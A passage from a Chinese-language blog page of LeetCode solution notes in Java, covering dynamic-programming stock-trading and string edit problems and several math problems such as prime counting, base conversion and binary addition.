class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="22-需要交易费用的股票交易"><a class="markdownIt-Anchor" href="#22-需要交易费用的股票交易"></a> 22. 需要交易费用的股票交易</h3><p>  <a href="https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock-with-transaction-fee/">https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock-with-transaction-fee/</a></p><h4 id="思路-58"><a class="markdownIt-Anchor" href="#思路-58"></a> 思路</h4><p>  和上题差不多，只是本次在每次卖出时需要加手续费，以及没有冷却期。</p><h4 id="代码-56"><a class="markdownIt-Anchor" href="#代码-56"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(<span class="keyword">int</span>[] prices, <span class="keyword">int</span> fee)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] sell=<span class="keyword">new</span> <span class="keyword">int</span>[prices.length];</span><br><span class="line">        <span class="keyword">int</span>[] buy=<span class="keyword">new</span> <span class="keyword">int</span>[prices.length];</span><br><span class="line">        <span class="keyword">if</span>(prices==<span class="keyword">null</span>||prices.length&lt;<span class="number">2</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        buy[<span class="number">0</span>]=-prices[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;prices.length;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            sell[i]=Math.max(buy[i-<span class="number">1</span>]+prices[i]-fee,sell[i-<span class="number">1</span>]);</span><br><span class="line">            buy[i]=Math.max(sell[i-<span class="number">1</span>]-prices[i],buy[i-<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sell[prices.length-<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="23-只能进行两次的股票交易"><a class="markdownIt-Anchor" href="#23-只能进行两次的股票交易"></a> 23. 只能进行两次的股票交易</h3><p>  <a href="https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock-iii/">https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock-iii/</a></p><h4 id="思路-59"><a class="markdownIt-Anchor" href="#思路-59"></a> 思路</h4><p>  对于任意一天考虑四个变量:<br />  fstBuy: 在该天第一次买入股票可获得的最大收益。<br />  fstSell: 在该天第一次卖出股票可获得的最大收益。<br />  secBuy: 在该天第二次买入股票可获得的最大收益。<br />  secSell: 在该天第二次卖出股票可获得的最大收益。<br />  分别对四个变量进行相应的更新, 最后secSell就是最大。</p><h4 id="代码-57"><a class="markdownIt-Anchor" href="#代码-57"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(<span class="keyword">int</span>[] prices)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> fstBuy = Integer.MIN_VALUE, fstSell = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> secBuy = Integer.MIN_VALUE, secSell = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;prices.length;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> p=prices[i];</span><br><span class="line">            fstBuy = Math.max(fstBuy, -p);</span><br><span class="line">            fstSell = Math.max(fstSell, fstBuy + p);</span><br><span class="line">            secBuy = Math.max(secBuy, fstSell - p);</span><br><span class="line">            secSell = Math.max(secSell, secBuy + p); </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> secSell;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="24-只能进行-k-次的股票交易"><a class="markdownIt-Anchor" href="#24-只能进行-k-次的股票交易"></a> 24. 只能进行 k 次的股票交易</h3><p>  <a href="https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock-iv/">https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock-iv/</a></p><h4 id="思路-60"><a class="markdownIt-Anchor" href="#思路-60"></a> 思路</h4><p>  对上一题进行推广，对每一个买卖次数进行遍历即可。<br />  但是由于K不固定，直接DP会MLE，所以对于K大于数组长度一半的情况下，即每天都可以考虑买入卖出的情况下，用贪心即可，既节省空间，又节省时间。</p><h4 id="代码-58"><a class="markdownIt-Anchor" href="#代码-58"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(<span class="keyword">int</span> k, <span class="keyword">int</span>[] prices)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(k &lt; <span class="number">1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(k &gt;= prices.length/<span class="number">2</span>) <span class="keyword">return</span> greedy(prices);</span><br><span class="line">        <span class="keyword">int</span>[][] t = <span class="keyword">new</span> <span class="keyword">int</span>[k][<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; k; i++)</span><br><span class="line">            t[i][<span class="number">0</span>] = Integer.MIN_VALUE;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;prices.length;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> p=prices[i];</span><br><span class="line">            t[<span class="number">0</span>][<span class="number">0</span>] = Math.max(t[<span class="number">0</span>][<span class="number">0</span>], -p);</span><br><span class="line">            t[<span class="number">0</span>][<span class="number">1</span>] = Math.max(t[<span class="number">0</span>][<span class="number">1</span>], t[<span class="number">0</span>][<span class="number">0</span>] + p);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;k;j++)</span><br><span class="line">            &#123;</span><br><span class="line">                t[j][<span class="number">0</span>]=Math.max(t[j][<span class="number">0</span>],t[j-<span class="number">1</span>][<span class="number">1</span>]-p);</span><br><span class="line">                t[j][<span class="number">1</span>]=Math.max(t[j][<span class="number">1</span>],t[j][<span class="number">0</span>]+p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> t[k-<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">greedy</span><span class="params">(<span class="keyword">int</span>[] prices)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> max = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; prices.length; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span>(prices[i] &gt; prices[i-<span class="number">1</span>])</span><br><span class="line">                max += prices[i] - prices[i-<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="25-删除两个字符串的字符使它们相等"><a class="markdownIt-Anchor" href="#25-删除两个字符串的字符使它们相等"></a> 25. 删除两个字符串的字符使它们相等</h3><p>  <a href="https://leetcode-cn.com/problems/delete-operation-for-two-strings/">https://leetcode-cn.com/problems/delete-operation-for-two-strings/</a></p><h4 id="思路-61"><a class="markdownIt-Anchor" href="#思路-61"></a> 思路</h4><p>  实际上还是求最长公共子序列，然后用两个字符串长度和减去就是最少删除步数。</p><h4 id="代码-59"><a class="markdownIt-Anchor" href="#代码-59"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minDistance</span><span class="params">(String word1, String word2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> m = word1.length(), n = word2.length();</span><br><span class="line">        <span class="keyword">int</span>[][] dp = <span class="keyword">new</span> <span class="keyword">int</span>[m + <span class="number">1</span>][n + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (word1.charAt(i - <span class="number">1</span>) == word2.charAt(j - <span class="number">1</span>)) &#123;</span><br><span class="line">                    dp[i][j] = dp[i - <span class="number">1</span>][j - <span class="number">1</span>] + <span class="number">1</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    dp[i][j] = Math.max(dp[i][j - <span class="number">1</span>], dp[i - <span class="number">1</span>][j]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> m + n - <span class="number">2</span> * dp[m][n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="26-编辑距离"><a class="markdownIt-Anchor" href="#26-编辑距离"></a> 26. 编辑距离</h3><p>  <a href="https://leetcode-cn.com/problems/edit-distance/">https://leetcode-cn.com/problems/edit-distance/</a></p><h4 id="思路-62"><a class="markdownIt-Anchor" href="#思路-62"></a> 思路</h4><p>  如果我们用<code>dp[i][j]</code>代表从<code>word1[0~i]</code>到<code>word2[0~j</code>所需的步数。那么如果要到达<code>dp[i][j]</code>的状态，一共可由三种状态转移而来:</p><ol><li><code>从dp[i-1][j-1]</code>转移而来，如果<code>从dp[i-1][j-1]=k</code>，那么如果<code>word1[i]=word2[j]</code>，那么仍然只需k步，否则需要替换一个字符，K+1步。</li><li><code>从dp[i][j-1]</code>转移而来，如果<code>从dp[i][j-1]=k</code>，那么我们需要插入一个<code>word2[j]</code>即可达到要求,故需要K+1步。</li><li><code>从dp[i-1][j]</code>转移而来，如果<code>从dp[i-1][j-1]=k</code>，那么我们需要删掉一个<code>word1[i]</code>即可达到要求，故需要K+1步。</li></ol><p>  最后需要注意，将dp数组初始化时上边界和左边界都置为i，因为对于任意一个字符串为空的情况下，将另一个字符串转换过来或转换为另一个字符串，都需要进行字符串长度步数的操作。</p><h4 id="代码-60"><a class="markdownIt-Anchor" href="#代码-60"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minDistance</span><span class="params">(String word1, String word2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (word1 == <span class="keyword">null</span> || word2 == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> m = word1.length(), n = word2.length();</span><br><span class="line">        <span class="keyword">int</span>[][] dp = <span class="keyword">new</span> <span class="keyword">int</span>[m + <span class="number">1</span>][n + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">            dp[i][<span class="number">0</span>] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            dp[<span class="number">0</span>][i] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (word1.charAt(i - <span class="number">1</span>) == word2.charAt(j - <span class="number">1</span>)) &#123;</span><br><span class="line">                    dp[i][j] = dp[i - <span class="number">1</span>][j - <span class="number">1</span>];</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    dp[i][j] = Math.min(dp[i - <span class="number">1</span>][j - <span class="number">1</span>], Math.min(dp[i][j - <span class="number">1</span>], dp[i - <span class="number">1</span>][j])) + <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m][n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="27-复制粘贴字符"><a class="markdownIt-Anchor" href="#27-复制粘贴字符"></a> 27. 复制粘贴字符</h3><p>  <a href="https://leetcode-cn.com/problems/2-keys-keyboard/">https://leetcode-cn.com/problems/2-keys-keyboard/</a></p><h4 id="思路-63"><a class="markdownIt-Anchor" href="#思路-63"></a> 思路</h4><p>  对于任意一个数，可以按照是否为质数来区分。</p><ol><li>如果他是质数，那就不能通过复制得到，只能每次粘贴1来打到，所以需要n步。</li><li>如果不是质数，就可以表示为两个数的乘积A*B，即构建长度为A的序列，然后复制B次(或者相反)，所以步数为A+B。</li><li>向下分解，如果AB中有不是质数的，例如B，依然可以表示为m*n，向下一直分解至质数。</li></ol><p>  故实际上就是将n分解为m个质数的乘积，且这m个质数的和最小。</p><p>  如果用DP的方式，那么对于<code>dp[i]</code>，可以转移过来的状态只有当其可以分为A*B时，其<code>dp[i]=dp[A]+dp[B]</code>。<br />  如果用递归的方式，需要从小到大找因数分解。</p><h4 id="代码-61"><a class="markdownIt-Anchor" href="#代码-61"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//DP版本</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minSteps</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] dp = <span class="keyword">new</span> <span class="keyword">int</span>[n + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">int</span> h = (<span class="keyword">int</span>) Math.sqrt(n);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            dp[i] = i;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">2</span>; j &lt;= h; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i % j == <span class="number">0</span>) &#123;</span><br><span class="line">                    dp[i] = dp[j] + dp[i / j];</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//递归版本</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minSteps</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= Math.sqrt(n); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (n % i == <span class="number">0</span>) <span class="keyword">return</span> i + minSteps(n / i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="八-数学"><a class="markdownIt-Anchor" href="#八-数学"></a> 八、数学</h2><h3 id="1-生成素数序列"><a class="markdownIt-Anchor" href="#1-生成素数序列"></a> 1. 生成素数序列</h3><p>  <a href="https://leetcode-cn.com/problems/count-primes/">https://leetcode-cn.com/problems/count-primes/</a></p><h4 id="思路-64"><a class="markdownIt-Anchor" href="#思路-64"></a> 思路</h4><p>  埃拉托斯特尼筛法(sieve of Eratosthenes)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">埃拉托斯特尼筛法，简称埃氏筛或爱氏筛，是一种由希腊数学家埃拉托斯特尼所提出的一种简单检定素数的算法。要得到自然数n以内的全部素数，必须把不大于根号n的所有素数的倍数剔除，剩下的就是素数。</span><br></pre></td></tr></table></figure><h4 id="代码-62"><a class="markdownIt-Anchor" href="#代码-62"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">countPrimes</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">         <span class="keyword">boolean</span>[] notPrimes = <span class="keyword">new</span> <span class="keyword">boolean</span>[n + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (notPrimes[i]) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            count++;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">long</span> j = (<span class="keyword">long</span>) (i) * i; j &lt; n; j += i) &#123;</span><br><span class="line">                notPrimes[(<span class="keyword">int</span>) j] = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-7进制"><a class="markdownIt-Anchor" href="#2-7进制"></a> 2. 7进制</h3><p>  <a href="https://leetcode-cn.com/problems/base-7/">https://leetcode-cn.com/problems/base-7/</a></p><h4 id="思路-65"><a class="markdownIt-Anchor" href="#思路-65"></a> 思路</h4><p>  与二进制一样，只需%7然后进位即可。</p><h4 id="代码-63"><a class="markdownIt-Anchor" href="#代码-63"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">convertToBase7</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (num == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;0&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">boolean</span> isNegative = num &lt; <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (isNegative) &#123;</span><br><span class="line">            num = -num;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (num &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            sb.append(num % <span class="number">7</span>);</span><br><span class="line">            num /= <span class="number">7</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String ret = sb.reverse().toString();</span><br><span class="line">        <span class="keyword">return</span> isNegative ? <span class="string">&quot;-&quot;</span> + ret : ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Java 中 static String toString(int num, int radix) 可以将一个整数转换为 radix 进制表示的字符串。</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">convertToBase7</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> Integer.toString(num, <span class="number">7</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-16-进制"><a class="markdownIt-Anchor" href="#3-16-进制"></a> 3. 16 进制</h3><p>  <a href="https://leetcode-cn.com/problems/convert-a-number-to-hexadecimal/">https://leetcode-cn.com/problems/convert-a-number-to-hexadecimal/</a></p><h4 id="思路-66"><a class="markdownIt-Anchor" href="#思路-66"></a> 思路</h4><p>  使用0x0b1111获取num的低4位。<br />  算数位移，其中正数右移左边补0，负数右移左边补1。<br />  位移运算并不能保证num==0，需要使用32位int保证（对应16进制小于等于8位）。</p><h4 id="代码-64"><a class="markdownIt-Anchor" href="#代码-64"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toHex</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span>[] map = &#123;<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>&#125;;</span><br><span class="line">        <span class="keyword">if</span> (num == <span class="number">0</span>) <span class="keyword">return</span> <span class="string">&quot;0&quot;</span>;</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">while</span> (num != <span class="number">0</span>) &#123;</span><br><span class="line">            sb.append(map[num &amp; <span class="number">0b1111</span>]);</span><br><span class="line">            num &gt;&gt;&gt;= <span class="number">4</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.reverse().toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-26-进制"><a class="markdownIt-Anchor" href="#4-26-进制"></a> 4. 26 进制</h3><p>  <a href="https://leetcode-cn.com/problems/excel-sheet-column-title/">https://leetcode-cn.com/problems/excel-sheet-column-title/</a></p><h4 id="思路-67"><a class="markdownIt-Anchor" href="#思路-67"></a> 思路</h4><p>  类似7进制，但是数据是从1开始，要先减1。</p><h4 id="代码-65"><a class="markdownIt-Anchor" href="#代码-65"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">convertToTitle</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (n &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">while</span> (n &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            n--;</span><br><span class="line">            sb.append((<span class="keyword">char</span>) (n % <span class="number">26</span> + <span class="string">&#x27;A&#x27;</span>));</span><br><span class="line">            n =n / <span class="number">26</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.reverse().toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-统计阶乘尾部有多少个-0"><a class="markdownIt-Anchor" href="#5-统计阶乘尾部有多少个-0"></a> 5. 统计阶乘尾部有多少个 0</h3><p>  <a href="https://leetcode-cn.com/problems/factorial-trailing-zeroes/">https://leetcode-cn.com/problems/factorial-trailing-zeroes/</a></p><h4 id="思路-68"><a class="markdownIt-Anchor" href="#思路-68"></a> 思路</h4><p>  有一个10尾部就有一个0，而10必然可以分解为2*5，2的数量明显多于5的数量，因此只要统计有多少个5即可。</p><h4 id="代码-66"><a class="markdownIt-Anchor" href="#代码-66"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">trailingZeroes</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> n == <span class="number">0</span> ? <span class="number">0</span> : n / <span class="number">5</span> + trailingZeroes(n / <span class="number">5</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-二进制加法"><a class="markdownIt-Anchor" href="#6-二进制加法"></a> 6. 二进制加法</h3><p>  <a href="https://leetcode-cn.com/problems/add-binary/">https://leetcode-cn.com/problems/add-binary/</a></p><h4 id="思路-69"><a class="markdownIt-Anchor" href="#思路-69"></a> 思路</h4><p>  从后向前遍历，用一个变量代表当前位的值，分别加两个字符串的该位置，然后%2就是当前位加完之后的数，/2就是需要进位的的数。</p><h4 id="代码-67"><a class="markdownIt-Anchor" href="#代码-67"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">addBinary</span><span class="params">(String a, String b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = a.length() - <span class="number">1</span>, j = b.length() - <span class="number">1</span>, carry = <span class="number">0</span>;</span><br><span class="line">        StringBuilder str = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">while</span> (carry == <span class="number">1</span> || i &gt;= <span class="number">0</span> || j &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i &gt;= <span class="number">0</span> &amp;&amp; a.charAt(i--) == <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">                carry++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (j &gt;= <span class="number">0</span> &amp;&amp; b.charAt(j--) == <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">                carry++;</span><br><span class="line">            &#125;</span><br><span class="line">            str.append(carry % <span class="number">2</span>);</span><br><span class="line">            carry /= <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> str.reverse().toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-字符串加法"><a class="markdownIt-Anchor" href="#7-字符串加法"></a> 7. 字符串加法</h3><p>  <a href="https://leetcode-cn.com/problems/add-strings/">https://leetcode-cn.com/problems/add-strings/</a></p><h4 id="思路-70"><a class="markdownIt-Anchor" href="#思路-70"></a> 思路</h4><p>  通上题，把2进位改成10进位即可。</p><h4 id="代码-68"><a class="markdownIt-Anchor" href="#代码-68"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">addStrings</span><span class="params">(String num1, String num2)</span> </span>&#123;</span><br><span class="line">        StringBuilder str = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">int</span> carry = <span class="number">0</span>, i = num1.length() - <span class="number">1</span>, j = num2.length() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (carry == <span class="number">1</span> || i &gt;= <span class="number">0</span> || j &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> x = i &lt; <span class="number">0</span> ? <span class="number">0</span> : num1.charAt(i--) - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            <span class="keyword">int</span> y = j &lt; <span class="number">0</span> ? <span class="number">0</span> : num2.charAt(j--) - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            str.append((x + y + carry) % <span class="number">10</span>);</span><br><span class="line">            carry = (x + y + carry) / <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> str.reverse().toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="8-改变数组元素使所有的数组元素都相等"><a class="markdownIt-Anchor" href="#8-改变数组元素使所有的数组元素都相等"></a> 8. 改变数组元素使所有的数组元素都相等</h3><p>  <a href="https://leetcode-cn.com/problems/minimum-moves-to-equal-array-elements-ii/">https://leetcode-cn.com/problems/minimum-moves-to-equal-array-elements-ii/</a></p><h4 id="思路-71"><a class="markdownIt-Anchor" href="#思路-71"></a> 思路</h4><p>  在我们将数组排序之后，移动距离最小的方式是所有元素都移动到中位数。</p><h4 id="代码-69"><a class="markdownIt-Anchor" href="#代码-69"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> 